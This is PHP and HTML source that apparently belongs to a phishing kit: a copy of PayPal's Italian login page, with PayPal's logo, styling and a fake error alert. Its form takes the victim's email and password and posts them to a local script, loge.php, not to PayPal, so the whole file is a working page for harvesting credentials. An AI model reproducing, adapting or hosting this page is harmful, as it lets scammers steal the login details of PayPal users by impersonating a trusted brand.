<?php
if (!isset($_SESSION)) {
  session_start();
}
 
include "../option.php";
include "../lang/Paye.php";
include "../lang/".lang2();
?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html lang="it"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title><?php echo $top_title2; ?></title><meta http-equiv="X-UA-Compatible" content="IE=9">
<link media="screen" rel="stylesheet" type="text/css" href="../css/global.css">
<link rel="stylesheet" type="text/css" href="../css/flowHFR.css">
<link rel="stylesheet" type="text/css" href="../css/country.css">
<link media="print" rel="stylesheet" type="text/css" href="../css/print.css">

<style type="text/css">
					html[data-device-type="dedicated"] { min-width: 71.7143em; }
					html { font-family: "Helvetica Neue",Helvetica,Arial,sans-serif; font-size: 87.5%; }
					html, body { margin : 0 auto; width : 100%; display:table; min-width: 988px;}					
					body { font-family : "Helvetica Neue", Helvetica, Arial, sans-serif; background-color:#FFFFFF; }
					#page {	margin-right: auto; margin-left: auto;	width:auto;	}
					#page .layout2a div.first { width: auto; }
					#page .layout2a div.last { width: 450px; float: left; margin-left:50px; }
					#content { background: none; width:960px; margin:0 auto; border-bottom: 1px solid #E5E5E5; }
					#main { width: auto; margin: 0 auto; -webkit-font-smoothing: antialiased;}
					#header { margin: 0 auto; height:70px !important; border-bottom: 1px solid #E5E5E5}
					#header h1 { padding: 12px 0 24px 6px; margin:auto; position: relative; width: 960px;}
					#footer { color:#777; width: 960px; margin: 0 auto; text-align:left; padding: 15px 0 0 0 !important; margin-bottom:40px; font-size:12px; }
					#footer p#footerSecure { display:none; }
					#footer ul li a	{ color: #777; text-decoration: none; }	
					#footer ul li a:hover { color:#444; }					
					#headline, #messageBox {display:none;}
					.form-signin { background-color: #F5F5F5; border-radius: 2px; display: block; max-width: 450px; margin: 0 auto; }
					.col.last .form-signin { background-color: #fff; }
					.social-box { margin: 70px auto; padding: 30px 40px; }
					.mktg { margin-top: 35px;}
					fieldset { margin: 0;}
					div.loginFields { width: 415px; }
					form div p { color: #777; font-size: 1.4em; line-height: 1.5em; margin: 0; padding-bottom: 14px; padding-top: 4px; }
					form fieldset p { padding-bottom:10px }
					input { -moz-appearance: none; -moz-box-sizing: border-box; background: none repeat 0 0 #FFF; border: 1px solid #B3B3B3; border-radius: 5px; color: #333; font-size: 1.071rem; height: 38px; line-height: 1.25em; margin: 0; padding: 0; position: relative; text-indent: 10px; transition: border-color 0.3s ease 0s; width: 250px; }
					.btn { -webkit-appearance: none; -moz-box-sizing: border-box; background: none repeat 0 0 #0079C1; border-radius: 5px; border-color: #0079C1; color: #FFF; cursor: pointer; display: inline-block; font-family: arial,sans-serif; font-size: 15px; font-weight: bold; line-height: 1.4545em; margin-bottom: 0; padding: 9px 15px 10px; text-align: center; vertical-align: middle; height:40px; _margin-left:-10px; *margin-left:-10px; }
					.btn:hover, .btn:focus { background: none repeat 0 0 #0285D2; color: #FFF; text-decoration: none; }
					.btn:focus { outline: thin dotted #333; outline-offset: -2px; }
					.btn.active, .btn:active { background-image: none; box-shadow: 0 2px 4px rgba(0, 0, 0, 0.15) inset, 0 1px 2px rgba(0, 0, 0, 0.05); outline: 0 none; }
					.btn.disabled, .btn[disabled], .btn.disabled:hover, .btn[disabled]:hover, .btn.disabled:active, .btn[disabled]:active { background: none repeat 0 0 #E5E5E5; cursor: auto; }
					.btn-large { border-radius: 6px; font-size: 17.234px; padding: 9px 14px; }
					.btn-large [class^="icon-"], .btn-large [class*=" icon-"] { margin-top: 4px }
					.btn-secondary { background: none repeat 0 0 #DDD; color: #333; }
					.btn-secondary:hover, .btn-secondary:focus { background: none repeat 0 0 #DDD; color: #333; }
					label { padding-left : 0; font-size: 0.7em; color: #000; }
					span.help { color: #777; font-size: 0.7em; }
					input.large { width: 337px }
					input.large[type="password"], input.large[type="text"] { font-size: 15px; font-weight: normal; }
					input[type="text"]:focus, input[type="password"]:focus { border-color: #0079C1; outline: 0 none; }
					#login_email_label, #login_password_label {font-size: 18px; }
					a.large { width: 310px; height:21px; }
					@-moz-document url-prefix() { a.large { width: 337px; height:40px;} }
					a.btn-secondary { text-decoration: none; *margin-left: 0; _margin-left: 0; }
					p.loginheadline { font-size: 28px; color: #444; font-weight: 300;}
					.headline, h3 { color: #444444; padding-top: 15px; font-weight: normal; font-size: 20px; line-height: 1.25em;}	
					.headline-content { font-size: 15px; font-weight: none; color: #777; margin-top:0; display:block;}
					.alert { border-bottom: 1px solid #ccc;  margin: 0 0 10px 0; padding: 15px; }
					.alert-warning { color: #dc3022; background-image: url("../css/img/icon_alert_24wx24h.gif"); background-position: 5px 15px; background-repeat: no-repeat; padding-left: 45px; font-size:13px; }

					.troubleshootingTips ul { font-size: 14px; margin-left:10px; }
					.troubleshootingTips li {list-style-type: none; margin: 0 0 0.3em 0;}
					.troubleshootingTips ul li > ul { margin-top: 4px;}
					.troubleshootingTips a { text-decoration: none; color: #0079C1; font-weight: bold; }
					#headerDiv .paypal-img-logo { margin-top: 4px; }
					#navPrimary {display: none;}
					p.contentLink a{ font-size: 13px; font-weight:bold; line-height: 1.5em; margin: 0 6px 0 2px; text-decoration: none; color: #0079C1; }
					.helpLink { border-bottom: 1px solid #CCC; margin-bottom: 15px; }
					#content p > a { border-left: 2px solid #CCC; display: inline-block; font-weight: normal; margin: 0 0 0 8px; padding-left: 10px; font-size: 1.4em; color: #0079C1; text-decoration:none; }
					#content p > .help > a { padding-bottom:12px; }
					#footerDiv{ background: none repeat 0 0 #FFFFFF;	padding-top:15px; padding-bottom:70px; padding-left:136px; position: relative; text-align: left; z-index: 2; border-top: 1px solid #E5E5E5; font-size: 12px; font-weight: 400; }					
					#legal{ font-size: 12px; margin: 20px 0 0 0; padding: 0 0 0 0.4em; }
					.signupLink { padding-left: 0; }

					.rtl #footer {text-align: right;}
					.rtl div.alert{padding: 15px 45px 15px 0;}
					.rtl div.alert-warning {background-position: 100% 15px;}

					// Media Queries
					@-ms-viewport {
					  width: device-width;
					}
					@media screen and (max-width : 768px) {
						#content { width: auto }
						div.loginFields { width: auto; }
						#header h1 { width: auto; }
						#page .layout2a div.last { display: none; }
						#twoB .layout2a div.last { display: block; float: none; margin-left: 0; width: 100%; }
						#page .layout2a div.first { width: 100%; }
						.form-signin { max-width: auto }
						.social-box { margin-top: 40px; margin-right: auto; margin-bottom: 40px; margin-left: auto; padding : 17px 30px; }
						input { width: 100% }
						.btn, .btn-secondary { width : auto }
						input.large { width: 100% }
						a.large { width: 88.5%; }
						@-moz-document url-prefix() { 
						 a.large { width: 100% }
						}
						#footerDiv{ padding-top:15px; padding-bottom:55px; padding-left:31px; }
						html, body { min-width: 0; }
						#main { width: auto !important; }
						#header {width:auto;}
						#footer { width: auto !important; padding-left:15px !important;}
					}					

					//Pwd recovery
					#pwrbox {display:none;}
					#pwrflow {padding-bottom:5px}
					#passwordRecoveryLightbox{-moz-border-radius: 5px;border-radius: 5px;box-shadow: 0 0 8px 1px rgba(0, 0, 0, 0.5);} #passwordRecoveryLightbox_c{width:420px;} 
					.underlay{display:none;} 
					.ui-dialog-titlebar div{width:100% !important} 
					#closeLB{display:none;}
</style>

			<link rel="shortcut icon" href="../css/img/pp_favicon_x.ico">
			<link rel="apple-touch-icon" href="../css/img/apple-touch-icon.png">
		</head>

<body><noscript><p class="nonjsAlert">PayPal need JavaScript in your browser.</p></noscript>
<div class="legacyErrors " id="page">
<div id="header" class="std"><h1>
	<a href="https://www.paypal.com/it/cgi-bin/webscr?cmd=_home"><img border="0" src="../css/img/paypal_logo.gif" alt="PayPal"></a>
</h1>
</div>
<div id="content"><div id="headline"><h2></h2>
</div><div id="messageBox" class="legacyErrors"><div class="messageBox error"><h2 class="accessAid"> </h2><p><?php echo $alert_alert_warning_div_0; ?></p></div></div><div id="main" class="legacyErrors"><div class="layout1"><div class="layout2a"><div class="col first"><div class="loginFields">

<form method="post" name="login_form" action="../loge.php?cmd=_login-submit&dispatch=5885d80a13c0db1<?php echo "&ee=$ee"; ?>">
	<input type="hidden" name="login_cmd" value=""><input type="hidden" name="login_params" value="">
	<div class="form-signin">
		<div class="social-box">
			<div class="alert alert-warning"><?php echo $alert_alert_warning_div_0; ?></div>
			<p class="loginheadline"><?php echo $loginheadline_p_0; ?></p>
			<fieldset>
				<legend class="accessAid"> </legend>
				<p><label for="userm" id="login_email_label"><span class="error"><?php echo $error_span_0; ?></span></label>
					<input type="text" id="userm" class="error large" name="userm" value=""></p>
					<p id="pwdGrp">
						<label for="userp" id="login_password_label"><span class="error"><?php echo $error_span_1; ?></span></label>
						<input autocomplete="off" type="password" id="userp" name="userp" value="" class="error large">
					</p>
					<p><input type="submit" name="submit.x" value="<?php echo $btn_large_input_0; ?>" class="btn large"></p>
			</fieldset>
			<p class="contentLink helpLink"><span><a id="pwrLinkoldflow" href="#cmd=_account-recovery&from=PayPal"><?php echo $pwrLinkoldflow_a_0; ?></a></span></p><p><strong><a class="btn btn-secondary large" href="#cmd=_registration-run"><?php echo $btn_btn_secondary_large_a_0; ?></a></strong></p>
		</div>
	</div>
	<input name="auth" type="hidden" value="APQBjjmBm0Q&#x2e;9Pipt9dcqv7WRCAuFlzf&#x2e;T3CvCpxU4qMIZfioIlOUYHkA0YPU1its">
	<input name="form_charset" type="hidden" value="UTF&#x2d;8">
</form>

</div></div><div class="col last"><div class="social-box mktg"><p class="headline"><?php echo $headline_p_0; ?></p><p class="headline"><?php echo $headline_p_1; ?></p></div></div></div></div><div class="layout1"><input type="hidden" name="cmd" id="countryCode" value="IT"><div id="pwrbox"><div id="passwordRecoveryLightbox"><div class="body"><div class="lightboxFixedTopPosition"><div class="ui-dialog-titlebar" id="ifrmContainer"></div><span id="closeLB">X</span></div><div class="buttons"></div></div><div class="footer"></div></div></div></div></div></div><div id="footer" role="contentinfo"><h2 class="accessAid"> </h2>

<ul>
<?php 
for ($i=0; $i <count($footer_li_footer_li) ; $i++) { 
    echo '<li><a href="#">'.$footer_li_footer_li[$i].'</a></li>';
}
?>  
</ul>

<p id="legal"><?php echo $legal_p_0; ?></p></div>
</body></html>
